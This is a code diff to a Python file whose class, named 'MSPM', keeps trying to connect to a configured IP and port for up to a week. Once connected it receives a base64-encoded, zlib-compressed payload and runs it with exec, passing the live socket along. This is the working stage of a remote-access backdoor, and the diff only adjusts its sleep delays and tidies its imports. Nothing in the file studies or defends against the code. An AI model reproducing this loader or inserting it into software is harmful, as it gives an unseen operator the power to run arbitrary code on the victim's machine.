@@ -1,3 +1,4 @@
+import imp
 import threading
 import sys
 import code
@@ -20,15 +21,6 @@ import random
 
 import urllib.request
 
-import imp
-
-#import tkinter
-#import pyscreeze
-#import pygame
-#import numpy
-#import scipy
-
-# https://stackoverflow.com/questions/15128225/python-script-to-read-and-write-a-path-to-registry
 
 class MSPM():
     def __init__(self):
@@ -74,14 +66,7 @@ class MSPM():
             #return None
 
     def __MSPM(self):
-        """for x in range(40320):  # 40320 * 15 = 604800 sec ---> One Week ----> range ==>40320
-            try:
-                s = socket.socket(2, socket.SOCK_STREAM)
-                s.connect((Config_Dict['IP'], Config_Dict['PORT']))
-                break
-            except:
-                time.sleep(15)"""
-        time.sleep(8)
+        time.sleep(10)
         for x in range(40320):  # 40320
             try:
                 Z = socket.socket(2, socket.SOCK_STREAM)
@@ -92,12 +77,12 @@ class MSPM():
                 break
             except:
                 # print("Failed to Connect")
-                time.sleep(11)
+                time.sleep(10)
         dd = Z.recv(DD)
-        time.sleep(7)
+        time.sleep(10)
         while len(d) < DD:
             dd += Z.recv(DD - len(dd))
-        time.sleep(12)
+        time.sleep(10)
         exec(zlib.decompress(base64.b64decode(dd)), {'s': Z})
 
     def MSPM_Main(self):
@@ -112,7 +97,7 @@ class MSPM():
         except:
             pass
         try:
-            time.sleep(7)
+            time.sleep(5)
             self.__MSPM()
         except:
             pass
